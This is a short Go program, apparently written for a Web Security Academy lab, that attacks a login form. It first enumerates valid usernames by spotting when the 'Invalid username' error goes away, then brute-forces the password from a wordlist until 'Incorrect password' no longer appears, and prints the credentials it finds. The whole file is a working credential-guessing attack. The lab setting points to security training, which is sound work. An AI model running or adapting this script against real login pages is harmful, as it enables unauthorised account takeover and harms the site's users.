package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"strings"
)

const (
	// this will change base on the current lab
	LoginURL = "https://ac941f591f3ab00fc0e04db400cc000e.web-security-academy.net/login"
)

var (
	UserNames = []string{}
	Passwords = []string{}
)

func LogFatal(err error) {
	if err != nil {
		log.Fatal(err)
	}
}
func readData(name string) []string {
	file, err := os.Open(name)
	LogFatal(err)
	defer file.Close()
	scanner := bufio.NewScanner(file)
	var data []string
	for scanner.Scan() {
		l := scanner.Text()
		if l != "" {
			data = append(data, l)
		}
	}
	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	return data
}
func Post(user, pass string) string {
	//url := LoginURL + "?username=" + user + "&password=" + pass
	data := url.Values{}
	data.Set("username", user)
	data.Set("password", pass)
	req, err := http.NewRequest("POST", LoginURL, strings.NewReader(data.Encode()))
	LogFatal(err)
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	client := http.Client{}
	res, err := client.Do(req)
	LogFatal(err)
	defer res.Body.Close()
	bd, err := ioutil.ReadAll(res.Body)
	LogFatal(err)
	return string(bd)

}
func EnumerateUsername() string {
	for _, v := range UserNames {
		fmt.Println("Testing Username: " + v)
		d := Post(v, "$$$$$$$")
		if !strings.Contains(d, "Invalid username") {
			//fmt.Println("Username Found: " + v)
			return v
		}
	}
	return ""
}
func EnumeratePassword(user string) string {
	for _, v := range Passwords {
		fmt.Println("Testing Password: " + v)
		d := Post(user, v)
		if !strings.Contains(d, "Incorrect password") {
			//fmt.Println("Username Found: " + v)
			return v
		}
	}
	return ""
}
func main() {
	// read usernames
	UserNames = readData("users.txt")
	// read passwords
	Passwords = readData("passwords.txt")
	// enumerate username
	username := EnumerateUsername()
	fmt.Println("Username found: " + username)
	password := EnumeratePassword(username)
	fmt.Println("Password found: " + password)
}
